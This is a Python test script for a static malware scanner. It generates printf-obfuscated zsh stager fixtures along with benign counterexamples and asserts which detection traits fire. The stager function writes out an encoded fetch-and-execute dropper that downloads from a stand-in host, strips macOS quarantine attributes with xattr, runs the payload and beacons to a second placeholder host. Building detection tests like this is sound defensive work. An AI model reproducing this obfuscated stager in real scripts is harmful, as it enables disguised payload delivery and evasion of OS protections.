#!/usr/bin/env python3
"""Static controls for printf-obfuscated shell stagers; never execute fixtures."""
import json
import os
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[1]
DROP = 'objectives/command-and-control/dropper/delivery/fetch-exec::printf-hidden-payload-execution'
CLEAR = 'objectives/evasion/anti-av/platform/gatekeeper::encoded-stager-clears-attributes'
BEACON = 'objectives/command-and-control/beacon/network/http::pasted-event-payload-beacon'
HOSTILE = {DROP, CLEAR, BEACON}


def stager(mode='octal', percent_b=False, quote=False):
    def encoded(text):
        if mode == 'octal':
            return ''.join('\\%03o' % ord(c) if c.isalnum() else c for c in text)
        if mode == 'hex':
            return ''.join('\\x%02x' % ord(c) if c.isalnum() else c for c in text)
        return ''.join(('\\%03o' % ord(c) if i % 3 else c) for i, c in enumerate(text))
    def assign(name, value):
        fmt = "'%b' " if percent_b else ''
        return f"{name}=$(printf {fmt}'{encoded(value)}')"
    lines = ['#!/bin/zsh', assign('client', 'curl'), assign('clearer', 'xattr'),
             assign('permissions', 'chmod'), assign('stage', '/tmp/.changed-payload'),
             assign('source', 'https://delivery.example.invalid/new/build'),
             assign('telemetry', 'https://events.example.invalid/status?event=pasted'),
             '${client} -X POST -H "BuildID: test-build" "${telemetry}" </dev/null >/dev/null 2>&1 &',
             '${client} -o ${stage} ${source} && ${clearer} -c ${stage} && ${permissions} +x ${stage} && ${stage}']
    if quote:
        lines[-1] = lines[-1].replace('${stage}', '"${stage}"')
    return '\n'.join(lines) + '\n'


def main():
    original = stager()
    fixtures = {
        'octal.sh': (original, HOSTILE),
        'hex.sh': (stager('hex'), HOSTILE),
        'mixed.sh': (stager('mixed'), HOSTILE),
        'percent-b.sh': (stager('octal', percent_b=True), HOSTILE),
        'quoted-path.sh': (stager(quote=True), HOSTILE),
        'no-beacon.sh': ('\n'.join(l for l in original.splitlines() if '-X POST' not in l), {DROP, CLEAR}),
        'no-clear.sh': (original.replace('${clearer} -c ${stage} && ', ''), {DROP}),
        'different-target.sh': (original.replace('&& ${stage}\n', '&& ${other}\n'), set()),
        'no-launch.sh': (original.replace(' && ${stage}\n', '\n'), set()),
        'unused-decoders.sh': ('\n'.join(original.splitlines()[:-2]) + '\nprintf "decoded values only\\n"\n', set()),
        'comments.sh': ('#!/bin/zsh\n' + '\n'.join('# '+l for l in original.splitlines()[1:]), set()),
        'heredoc.sh': ("#!/bin/zsh\ncat <<'EXAMPLE'\n" + original + 'EXAMPLE\n', set()),
        'literal-output.sh': (original.replace('$(printf ', "$(printf '%s' "), set()),
        'local-maintenance.sh': ('#!/bin/zsh\nxattr -c ./built-tool\nchmod +x ./built-tool\n./built-tool --version\n', set()),
        'redirect-only.sh': ('#!/bin/sh\ncurl -I https://example.invalid </dev/null >/dev/null 2>&1 &\n', set()),
        'actual-helper.sh': ('#!/bin/sh\n./helper >/dev/null 2>&1 &\n', set()),
    }
    with tempfile.TemporaryDirectory(prefix='encoded-stager-controls-') as tmp:
        paths=[]
        for name,(source,_) in fixtures.items():
            p=Path(tmp)/name;p.write_text(source);paths.append(str(p))
        result=subprocess.run([os.environ.get('ATOMSCAN','atomscan'),'--no-update','--mode','slow','--format','json','path',*paths], cwd=ROOT,env=dict(os.environ,CLEAVE_TRAITS_DIR=str(ROOT)),capture_output=True,text=True)
        if result.returncode not in (0,1):
            raise RuntimeError(result.stderr)
        assert 'Failed to parse YAML' not in result.stderr,result.stderr
        found={}
        for line in result.stdout.splitlines():
            root=json.loads(line)['raw']['files'][0]
            found[Path(root['path']).name]={t['id']:t['crit'] for t in root.get('traits',[])}
        assert found.keys()==fixtures.keys(),found.keys()
        for name,(_,expected) in fixtures.items():
            actual={t for t in found[name] if t in HOSTILE}
            assert actual==expected,(name,actual,expected)
            assert all(found[name][t]==5 for t in actual),(name,found[name])
        helper='micro-behaviors/process/create/background::path-helper-background-output-discarded'
        assert helper not in found['redirect-only.sh']
        assert helper in found['actual-helper.sh']
        for name in ('comments.sh','heredoc.sh','literal-output.sh','unused-decoders.sh'):
            assert all(v<4 for v in found[name].values()),(name,found[name])
        print(f'Passed {len(fixtures)} static shell controls: encoding, quoting, same-target execution, and benign counterexamples')


if __name__=='__main__':
    main()
